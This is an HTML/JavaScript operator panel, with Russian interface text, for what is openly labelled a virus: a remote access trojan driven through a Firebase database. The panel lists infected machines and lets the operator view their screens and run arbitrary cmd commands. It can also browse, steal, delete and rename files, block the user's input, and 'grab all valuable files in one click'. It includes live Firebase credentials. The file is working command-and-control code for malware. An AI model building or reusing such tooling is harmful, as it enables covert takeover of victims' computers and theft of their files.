<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Admin Panel v5.0</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body { background: #0a0a0a; color: #ccc; font-family: 'Courier New', monospace; }
        .sidebar { background: #1a1a1a; min-width: 250px; padding: 1rem; border-right: 1px solid #333; height: 100vh; overflow-y: auto; }
        .client-item { display: flex; align-items: center; padding: 8px 12px; margin: 4px 0; background: #222; border-radius: 6px; cursor: pointer; }
        .client-item:hover { background: #2a2a2a; }
        .client-item.active { background: #0b5ed7; color: white; }
        .status-dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
        .online { background: #00e676; }
        .offline { background: #ff1744; }
        .screen-img { max-width: 100%; max-height: 400px; border: 2px solid #333; }
        .log-area { height: 150px; overflow-y: auto; background: #111; color: #0f0; padding: 8px; font-size: 0.9rem; }
        .preset-card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 10px; margin: 5px 0; }
        .nav-tabs .nav-link { color: #ccc; }
        .nav-tabs .nav-link.active { background: #1a1a1a; border-color: #333; color: #fff; }
        .table-dark { --bs-table-bg: #111; --bs-table-border-color: #333; }
        .clickable-row { cursor: pointer; }
        .clickable-row:hover { background: #222; }
    </style>
</head>
<body>
<div class="d-flex">
    <!-- Боковая панель клиентов -->
    <div class="sidebar">
        <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
        <div id="clientList"></div>
        <div class="mt-2 small" id="connectionStatus"></div>
    </div>

    <!-- Основная панель -->
    <div class="flex-grow-1 p-3">
        <div id="mainContent">
            <div class="text-center text-secondary mt-5">
                <i class="bi bi-arrow-left-circle" style="font-size: 3rem;"></i>
                <h4>Выберите клиента</h4>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, onValue, off, set, update } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
    authDomain: "gen-lang-client-0884792103.firebaseapp.com",
    databaseURL: "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "gen-lang-client-0884792103",
    storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
    messagingSenderId: "556057210756",
    appId: "1:556057210756:web:45677d6e28066be811f7d1"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentClient = null;
let screenUnsub = null;
let fileListUnsub = null;
let clientsData = {};
let clientElements = {};
let currentPath = "C:\\"; // начальный путь для файлового менеджера

// ========== Работа со списком клиентов ==========
onValue(ref(db, 'clients'), (snap) => {
    const data = snap.val();
    const list = document.getElementById('clientList');
    list.innerHTML = '';
    if (!data) {
        list.innerHTML = '<div class="text-muted">Нет клиентов</div>';
        return;
    }
    Object.keys(data).forEach(id => {
        const info = data[id] || {};
        clientsData[id] = { last_seen: info.last_seen || 0 };
        const item = document.createElement('div');
        item.className = 'client-item';
        item.dataset.clientId = id;
        item.innerHTML = `<span class="status-dot" id="dot-${id}"></span> ${id}`;
        item.onclick = () => selectClient(id);
        list.appendChild(item);
        clientElements[id] = item;
        updateStatus(id);
    });
});

function updateStatus(id) {
    const dot = document.getElementById(`dot-${id}`);
    if (!dot) return;
    const last = clientsData[id]?.last_seen || 0;
    const online = (Date.now() - last) < 12000;
    dot.className = `status-dot ${online ? 'online' : 'offline'}`;
}
setInterval(() => Object.keys(clientsData).forEach(updateStatus), 2000);

onValue(ref(db, '.info/connected'), (snap) => {
    const el = document.getElementById('connectionStatus');
    if (snap.val()) {
        el.innerHTML = '<i class="bi bi-wifi"></i> Connected';
        el.style.color = '#00e676';
    } else {
        el.innerHTML = '<i class="bi bi-wifi-off"></i> Disconnected';
        el.style.color = '#ff1744';
    }
});

// ========== Выбор клиента ==========
function selectClient(id) {
    if (currentClient && clientElements[currentClient]) {
        clientElements[currentClient].classList.remove('active');
    }
    currentClient = id;
    if (clientElements[id]) clientElements[id].classList.add('active');
    if (screenUnsub) { screenUnsub(); screenUnsub = null; }
    if (fileListUnsub) { fileListUnsub(); fileListUnsub = null; }
    renderPanel(id);
    // Подписка на скриншот
    screenUnsub = onValue(ref(db, `clients/${id}/screenshot`), (snap) => {
        const img = document.getElementById('screenshotImg');
        if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
    });
    // Подписка на результат действий с файлами
    onValue(ref(db, `clients/${id}/file_action_result`), (snap) => {
        const val = snap.val();
        if (val) addLog(`[FileAction] ${val}`);
    });
    // Подписка на статус граббера
    onValue(ref(db, `clients/${id}/grab_status`), (snap) => {
        const val = snap.val();
        if (val) {
            document.getElementById('grabStatus').innerText = val;
            addLog(`[Grab] ${val}`);
        }
    });
    // По умолчанию запросим список файлов C:\
    requestFileList('C:\\');
}

function addLog(msg) {
    const log = document.getElementById('logArea');
    if (!log) return;
    log.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
    log.scrollTop = log.scrollHeight;
}

// Пресеты (как раньше)
const PRESETS_KEY = 'remoteControlPresets';
function loadPresets() {
    try {
        const raw = localStorage.getItem(PRESETS_KEY);
        return raw ? JSON.parse(raw) : Array(7).fill({ name: '', command: '', payload: '' });
    } catch (e) {
        return Array(7).fill({ name: '', command: '', payload: '' });
    }
}
function savePresets(presets) { localStorage.setItem(PRESETS_KEY, JSON.stringify(presets)); }

// ========== Рендер основной панели с табами ==========
function renderPanel(id) {
    const main = document.getElementById('mainContent');
    const presets = loadPresets();

    let presetsHtml = '';
    for (let i = 0; i < 7; i++) {
        const p = presets[i];
        presetsHtml += `
        <div class="preset-card">
            <div class="row g-2 align-items-end">
                <div class="col-md-3">
                    <label class="form-label">Название</label>
                    <input type="text" class="form-control form-control-sm preset-name" data-index="${i}" value="${p.name || ''}">
                </div>
                <div class="col-md-3">
                    <label class="form-label">Команда</label>
                    <input type="text" class="form-control form-control-sm preset-cmd" data-index="${i}" value="${p.command || ''}">
                </div>
                <div class="col-md-4">
                    <label class="form-label">Payload</label>
                    <input type="text" class="form-control form-control-sm preset-payload" data-index="${i}" value="${p.payload || ''}">
                </div>
                <div class="col-md-2">
                    <button class="btn btn-outline-primary btn-sm w-100 preset-run" data-index="${i}">▶ Запустить</button>
                </div>
            </div>
        </div>`;
    }

    main.innerHTML = `
        <h3><i class="bi bi-sliders"></i> Управление: <span class="text-info">${id}</span></h3>
        <ul class="nav nav-tabs mt-2" id="mainTabs" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="control-tab" data-bs-toggle="tab" data-bs-target="#control" type="button" role="tab">Управление</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button" role="tab">Файловый менеджер</button>
            </li>
        </ul>
        <div class="tab-content mt-3">
            <!-- Вкладка управления -->
            <div class="tab-pane fade show active" id="control" role="tabpanel">
                <div class="row">
                    <div class="col-md-8">
                        <div class="card bg-dark border-secondary">
                            <div class="card-header">Скриншот</div>
                            <div class="card-body text-center">
                                <img id="screenshotImg" class="screen-img" src="" alt="Нет данных">
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card bg-dark border-secondary">
                            <div class="card-header">Лог</div>
                            <div class="card-body p-0">
                                <div id="logArea" class="log-area"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mt-3">
                    <h5>Быстрые команды</h5>
                    <div class="d-flex flex-wrap gap-2">
                        <button class="btn btn-outline-warning btn-hacker" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
                        <button class="btn btn-outline-warning" onclick="sendCmd('crazy_mouse')"><i class="bi bi-mouse"></i> Crazy Mouse</button>
                        <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
                        <button class="btn btn-outline-primary" onclick="sendCmd('open_calc')"><i class="bi bi-calculator"></i> Open Calc</button>
                        <button class="btn btn-outline-light" onclick="sendCmd('swap_mouse')"><i class="bi bi-arrow-left-right"></i> Swap Mouse</button>
                    </div>
                    <div class="mt-2 d-flex gap-2">
                        <button class="btn btn-outline-danger" onclick="sendBlockInput(true)"><i class="bi bi-lock"></i> Включить блокировку</button>
                        <button class="btn btn-outline-success" onclick="sendBlockInput(false)"><i class="bi bi-unlock"></i> Выключить блокировку</button>
                        <button class="btn btn-outline-warning" onclick="sendDisco()"><i class="bi bi-boombox"></i> Disco 10s</button>
                    </div>
                    <div class="input-group mt-2">
                        <input type="text" id="msgText" class="form-control" placeholder="Текст сообщения">
                        <button class="btn btn-outline-success" onclick="sendMsg()"><i class="bi bi-send"></i> Сообщение</button>
                    </div>
                    <div class="input-group mt-2">
                        <input type="text" id="ttsText" class="form-control" placeholder="Текст для озвучки">
                        <button class="btn btn-outline-success" onclick="sendTTS()"><i class="bi bi-volume-up"></i> Озвучить</button>
                    </div>
                    <div class="input-group mt-2">
                        <input type="text" id="wallpaperUrl" class="form-control" placeholder="URL картинки для обоев">
                        <button class="btn btn-outline-success" onclick="sendWallpaper()"><i class="bi bi-image"></i> Сменить обои</button>
                    </div>
                    <div class="input-group mt-2">
                        <input type="text" id="cmdExec" class="form-control" placeholder="Команда для cmd_execute">
                        <button class="btn btn-outline-danger" onclick="sendCmdExec()"><i class="bi bi-terminal"></i> Выполнить CMD</button>
                    </div>
                    <hr>
                    <button class="btn btn-danger btn-lg w-100" onclick="sendCmd('self_destruct')"><i class="bi bi-skull"></i> ВЫКЛЮЧИТЬ ВИРУС</button>
                </div>
                <div class="mt-4">
                    <h5><i class="bi bi-star-fill text-warning"></i> Пресеты (7 слотов)</h5>
                    ${presetsHtml}
                    <small class="text-muted">Изменения сохраняются автоматически</small>
                </div>
            </div>

            <!-- Вкладка файлового менеджера -->
            <div class="tab-pane fade" id="files" role="tabpanel">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <h5>📁 Текущий путь: <span id="currentPathDisplay">${currentPath}</span></h5>
                    <button class="btn btn-danger btn-lg" onclick="grabPrecious()">🛡 Скачать всё ценное в 1 клик</button>
                </div>
                <div id="grabStatus" class="text-warning mb-2"></div>
                <table class="table table-dark table-hover">
                    <thead>
                        <tr>
                            <th>Имя</th>
                            <th>Тип</th>
                            <th>Размер</th>
                            <th>Действия</th>
                        </tr>
                    </thead>
                    <tbody id="fileTableBody"></tbody>
                </table>
                <div class="mt-2">
                    <button class="btn btn-outline-light" onclick="goUpFolder()">⬆ На уровень выше</button>
                    <input type="text" id="renameInput" class="form-control mt-2" placeholder="Новое имя (для переименования)">
                </div>
            </div>
        </div>
    `;

    // Обработчики для пресетов
    document.querySelectorAll('.preset-name, .preset-cmd, .preset-payload').forEach(el => {
        el.addEventListener('input', () => updatePreset(el.dataset.index));
    });
    document.querySelectorAll('.preset-run').forEach(btn => {
        btn.addEventListener('click', () => runPreset(btn.dataset.index));
    });

    // Активируем табы Bootstrap
    const tabTriggerList = document.querySelectorAll('#mainTabs button');
    tabTriggerList.forEach(tab => {
        tab.addEventListener('click', function(e) {
            e.preventDefault();
            const target = this.dataset.bsTarget;
            // Скрываем все панели
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('show', 'active'));
            // Показываем нужную
            document.querySelector(target).classList.add('show', 'active');
            // Обновляем активность табов
            tabTriggerList.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Подписываемся на file_list
    if (fileListUnsub) fileListUnsub();
    fileListUnsub = onValue(ref(db, `clients/${currentClient}/file_list`), (snap) => {
        const val = snap.val();
        if (val) {
            try {
                const data = JSON.parse(val);
                if (data.error) {
                    addLog(`[FileList Error] ${data.error}`);
                    return;
                }
                currentPath = data.current_path;
                document.getElementById('currentPathDisplay').innerText = currentPath;
                populateFileTable(data.items);
            } catch (e) {
                console.error(e);
            }
        }
    });
}

function populateFileTable(items) {
    const tbody = document.getElementById('fileTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    items.forEach(item => {
        const row = document.createElement('tr');
        row.className = 'clickable-row';
        row.innerHTML = `
            <td>${item.is_dir ? '<i class="bi bi-folder-fill text-warning"></i> ' : '<i class="bi bi-file"></i> '}${item.name}</td>
            <td>${item.is_dir ? 'Папка' : 'Файл'}</td>
            <td>${item.is_dir ? '' : formatSize(item.size)}</td>
            <td>
                ${item.is_dir ? '' : `<button class="btn btn-sm btn-outline-info me-1" onclick="downloadFile('${item.name}')"><i class="bi bi-download"></i></button>`}
                <button class="btn btn-sm btn-outline-danger me-1" onclick="deleteItem('${item.name}')"><i class="bi bi-trash"></i></button>
                <button class="btn btn-sm btn-outline-light" onclick="renameItem('${item.name}')"><i class="bi bi-pencil"></i></button>
            </td>
        `;
        // Двойной клик для входа в папку
        if (item.is_dir) {
            row.addEventListener('dblclick', () => {
                requestFileList(currentPath + '\\' + item.name);
            });
        }
        tbody.appendChild(row);
    });
}

function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    else if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    else return (bytes / 1048576).toFixed(1) + ' MB';
}

function requestFileList(path) {
    if (!currentClient) return;
    sendCmd('list_files', path);
}

function goUpFolder() {
    if (!currentPath) return;
    const parent = currentPath.split('\\').slice(0, -1).join('\\') || 'C:\\';
    requestFileList(parent);
}

function downloadFile(name) {
    const filePath = currentPath + '\\' + name;
    const payload = JSON.stringify({ action: 'download', target: filePath });
    sendCmd('file_action', payload);
    // После этого нужно ждать появления file_download в базе и скачать
    addLog(`Запрос на скачивание: ${filePath}`);
    // Подпишемся временно на file_download
    const unsub = onValue(ref(db, `clients/${currentClient}/file_download`), (snap) => {
        const val = snap.val();
        if (val && val.data) {
            // Инициируем загрузку в браузере
            const link = document.createElement('a');
            link.href = `data:application/octet-stream;base64,${val.data}`;
            link.download = val.name;
            link.click();
            addLog(`Файл ${val.name} загружен`);
            unsub(); // отписываемся
            // Очищаем file_download
            set(ref(db, `clients/${currentClient}/file_download`), null);
        }
    });
}

function deleteItem(name) {
    if (!confirm(`Удалить ${name}?`)) return;
    const filePath = currentPath + '\\' + name;
    const payload = JSON.stringify({ action: 'delete', target: filePath });
    sendCmd('file_action', payload);
    // Перезапросить список через некоторое время
    setTimeout(() => requestFileList(currentPath), 1500);
}

function renameItem(oldName) {
    const newName = document.getElementById('renameInput').value.trim();
    if (!newName) return alert('Введите новое имя');
    const oldPath = currentPath + '\\' + oldName;
    const payload = JSON.stringify({ action: 'rename', target: oldPath, new_name: newName });
    sendCmd('file_action', payload);
    setTimeout(() => requestFileList(currentPath), 1500);
}

function grabPrecious() {
    if (!currentClient) return;
    sendCmd('grab_precious');
    addLog('Запущен сбор ценных файлов...');
    document.getElementById('grabStatus').innerText = 'Идёт архивация...';
}

// ========== Универсальная отправка команд ==========
window.sendCmd = function(cmd, payload = '') {
    if (!currentClient) return alert('Выберите клиента!');
    const updates = { [`clients/${currentClient}/command`]: cmd };
    if (payload) updates[`clients/${currentClient}/payload`] = payload;
    update(ref(db), updates).then(() => addLog(`Отправлено: ${cmd}${payload ? ' ('+payload+')' : ''}`)).catch(console.error);
};

window.sendMsg = function() { const text = document.getElementById('msgText')?.value.trim(); if(text) sendCmd('msg', text); };
window.sendTTS = function() { const text = document.getElementById('ttsText')?.value.trim(); if(text) sendCmd('tts', text); };
window.sendWallpaper = function() { const url = document.getElementById('wallpaperUrl')?.value.trim(); if(url) sendCmd('wallpaper', url); };
window.sendBlockInput = function(enable) { sendCmd('block_input', enable ? 'true' : 'false'); };
window.sendDisco = function() { sendCmd('disco', '10'); };
window.sendCmdExec = function() { const cmdText = document.getElementById('cmdExec')?.value.trim(); if(cmdText) sendCmd('cmd_execute', cmdText); };

function updatePreset(index) {
    const name = document.querySelector(`.preset-name[data-index="${index}"]`)?.value || '';
    const command = document.querySelector(`.preset-cmd[data-index="${index}"]`)?.value || '';
    const payload = document.querySelector(`.preset-payload[data-index="${index}"]`)?.value || '';
    const presets = loadPresets();
    presets[index] = { name, command, payload };
    savePresets(presets);
}
function runPreset(index) {
    if (!currentClient) return alert('Выберите клиента!');
    const presets = loadPresets();
    const preset = presets[index];
    if (!preset.command) return alert('Команда не задана');
    sendCmd(preset.command, preset.payload);
}
</script>
</body>
</html>
